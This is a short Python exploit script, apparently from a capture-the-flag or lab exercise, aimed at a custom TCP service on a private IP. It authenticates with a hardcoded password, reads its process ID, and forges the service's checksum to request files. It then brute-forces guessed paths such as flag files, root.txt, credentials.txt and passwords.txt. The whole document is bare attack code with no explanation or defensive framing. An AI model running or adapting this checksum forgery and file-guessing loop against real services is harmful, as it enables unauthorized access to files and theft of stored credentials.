import socket
import re

def calc_crc(pid, path):
    return f"{sum(path.encode('ascii')) ^ pid:x}"

s = socket.create_connection(('192.168.60.113', 8833), timeout=3)
s.recv(2048)
s.sendall(b'AUTH R3v3rs3_Th3_Z0n3\n')
s.recv(1024)
s.sendall(b'WHOAMI\n')
whoami = s.recv(1024).decode()
pid = int(re.search(r'PID:\s*(\d+)', whoami).group(1))
print(f"Spawned PID: {pid}")

names = [
    'flag', 'flag1', 'flag2', 'flag3', 'flag4', 'flag5', 'flag6',
    'flag.txt', 'flag1.txt', 'flag2.txt', 'flag3.txt', 'flag4.txt', 'flag5.txt', 'flag6.txt',
    'flag_1.txt', 'flag_2.txt', 'flag_3.txt', 'flag_4.txt', 'flag_5.txt', 'flag_6.txt',
    'user.txt', 'root.txt', 'secret.txt', 'notes.txt', 'credentials.txt',
    'passwords.txt', 'key', 'key.txt', 'admin', 'admin.txt'
]

for name in names:
    path = f'/Desktop/{name}'
    crc = calc_crc(pid, path)
    s.sendall(f'PIDREQ {pid} {path} {crc}\n'.encode())
    res = s.recv(1024).decode(errors='ignore')
    if 'access denied' not in res.lower():
        print(f"[+] HIT: {path} -> {res.strip()}")
s.close()

